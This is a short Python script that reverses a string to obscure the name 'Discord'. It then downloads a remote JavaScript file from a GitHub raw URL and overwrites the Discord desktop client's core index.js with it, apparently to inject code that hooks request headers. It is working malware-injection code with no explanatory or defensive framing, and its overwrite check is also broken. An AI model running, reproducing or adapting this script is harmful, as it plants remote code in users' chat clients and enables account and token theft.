import requests
import os

currentDir = ""
secretGoverment = "drocsiD"[::-1]

appdata = os.getenv('LOCALAPPDATA')
code = requests.get("https://raw.githubusercontent.com/G-aad-a/sussyboy/main/moneybanana.js").text
for dir in os.listdir(appdata+f"/{secretGoverment}/"):
    if "app-" in dir:
        currentDir = appdata+ f"/{secretGoverment}/" + dir + "/modules"
        break

for dir in os.listdir(currentDir):
    if f"{secretGoverment}_desktop_core" in dir:
        currentDir = currentDir + "/" + dir + f"/{secretGoverment}_desktop_core"
        break

file = currentDir + "/index.js"
with open(file, "w+") as f:
    if f.writable() and "webRequest.onBeforeSendHeaders" not in f.read():
        f.write(code)
        f.close()